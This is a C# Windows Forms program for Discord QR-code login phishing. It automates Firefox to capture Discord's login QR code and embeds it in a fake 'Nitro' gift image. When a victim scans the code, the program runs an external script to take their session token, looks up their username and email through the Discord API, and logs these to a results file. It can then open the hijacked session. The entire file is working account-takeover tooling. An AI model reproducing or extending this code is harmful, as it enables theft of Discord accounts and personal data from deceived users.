using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Support.UI;
using System.Net;
using System.IO;

namespace DiscordQR
{
    public partial class Form1 : Form
    {
        private List<Image> qrList = new List<Image>();
        private List<IWebDriver> drivers = new List<IWebDriver>();

        private Dictionary<int, Discord> dict = new Dictionary<int, Discord>();
        private int currentIndex = 0;
        public Form1()
        {
            if (!Directory.Exists("results")) Directory.CreateDirectory("results");
            InitializeComponent();
            this.pictureBox1.Image = Image.FromFile("files/template.png");
        }
        [STAThread]
        public void SeleniumHandler()
        {
            int workingIndex = currentIndex;
            var firefoxDriverService = FirefoxDriverService.CreateDefaultService();
            var firefoxOptions = new FirefoxOptions();

            firefoxDriverService.SuppressInitialDiagnosticInformation = true;
            firefoxDriverService.HideCommandPromptWindow = true;

            //firefoxOptions.AddArgument("--headless");            

            IWebDriver driver = new FirefoxDriver(firefoxDriverService, firefoxOptions);
            //driver.Manage().Window.Minimize();

            drivers.Add(driver);

            WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
            driver.Navigate().GoToUrl("https://discord.com/login");
            log("Launching Browser #" + workingIndex);
            wait.Until(webDriver => webDriver.FindElement(By.ClassName("qrCode-wG6ZgU")));

            IWebElement firstResult = driver.FindElement(By.ClassName("qrCode-wG6ZgU"));

            Thread.Sleep(3000);
            firstResult = driver.FindElement(By.CssSelector(".qrCode-wG6ZgU > img:nth-child(2)"));
            log("Waiting for webpage...");
            //Generating QR
            string QRbase64 = firstResult.GetAttribute("src");
            byte[] img = Convert.FromBase64String(QRbase64.Replace("data:image/png;base64,", ""));
            log("Generating QR_" + workingIndex);
            Image backImg = Image.FromStream(new MemoryStream(img));
            Image overlay = Image.FromFile("files/overlay.png");

            Graphics g = Graphics.FromImage(backImg);

            g.DrawImage(overlay, 55, 60, 50, 50);

            Stream finalQR = new MemoryStream();
            backImg.Save(finalQR, ImageFormat.Png);

            backImg = Image.FromFile("files/template.png");
            overlay = Image.FromStream(finalQR);

            g = Graphics.FromImage(backImg);
            g.DrawImage(overlay, 120, 409);

            backImg.Save("results/nitroQr_" + currentIndex + ".png");
            Image finalResult = Image.FromFile("results/nitroQr_" + currentIndex + ".png");

            qrList.Add(finalResult);

            Discord d = new Discord(currentIndex);

            dict.Add(currentIndex, d);

            dataGridView1.Invoke((Action)delegate
            {
                dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
            });          

            currentIndex += 1;
        

            pictureBox1.Invoke((Action)delegate
            {
                this.pictureBox1.Image = finalResult;
            });
            log("Waiting for login on QR_" + workingIndex);
            wait = new WebDriverWait(driver, TimeSpan.FromSeconds(300));
            wait.Until(webDriver => webDriver.Url != "https://discord.com/login");

            string token = ((IJavaScriptExecutor)driver).ExecuteScript(File.ReadAllText("files/token.js")).ToString();

            d.DiscordToken = token;

            WebRequest request = WebRequest.Create("https://canary.discord.com/api/v8/users/@me");
            request.Method = "GET";
            request.ContentType = "application/json";

            request.Headers["Authorization"] = token;

            Stream response = request.GetResponse().GetResponseStream();         
            string jsonData = new StreamReader(response).ReadToEnd();
            Dictionary<string, object> dictionary = (Dictionary<string, object>)Json.Deserialize(jsonData);

            d.DiscordUsername = dictionary["username"].ToString();
            d.DiscordEmail = dictionary["email"].ToString();

            SafeWriter("results/results.txt", d.ToString());

            dict[workingIndex] = d;

            dataGridView1.Invoke((Action)delegate
            {
                update();
            });
        }

        private void update()
        {
            dataGridView1.Rows.Clear();
            foreach (Discord d in dict.Values)
            {
                dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
            }
        }

        private void genBtn_Click(object sender, EventArgs e)
        {
            new Thread(() => SeleniumHandler()).Start();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/Pyhoma69");
        }

        private void fClosing(object sender, FormClosingEventArgs e)
        {
            foreach (IWebDriver d in drivers)
            {
                d.Quit();
            }
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
            try
            {
                int i = int.Parse(dataGridView1.CurrentRow.Cells[0].Value.ToString());
                if (dataGridView1.Columns[e.ColumnIndex].Name == "CopyQR")
                {
                    Clipboard.SetImage(Image.FromFile("results/nitroQr_" + i + ".png"));
                }
                else
                {
                    string token = dataGridView1.CurrentRow.Cells[1].Value.ToString();
                    if (token != "/")
                    {
                        drivers[i].Manage().Window.Maximize();
                    }
                    else { throw new Exception("No one used the QR yet!"); }
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.Message, "Error"); }
        }

        private void log(string output)
        {
            richTextBox1.Invoke((Action)delegate
            {
                if (!string.IsNullOrWhiteSpace(richTextBox1.Text))
                {
                    richTextBox1.AppendText("\r\n" + output);
                }
                else
                {
                    richTextBox1.AppendText(output);
                }
                richTextBox1.ScrollToCaret();
            });
        }

        private static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
        private static void SafeWriter(string path, string content)
        {
            _readWriteLock.EnterWriteLock();
            try
            {
                using (StreamWriter sw = File.AppendText(path))
                {
                    sw.WriteLine(content);
                    sw.Close();
                }
            }
            finally
            {
                _readWriteLock.ExitWriteLock();
            }
        }
    }
}
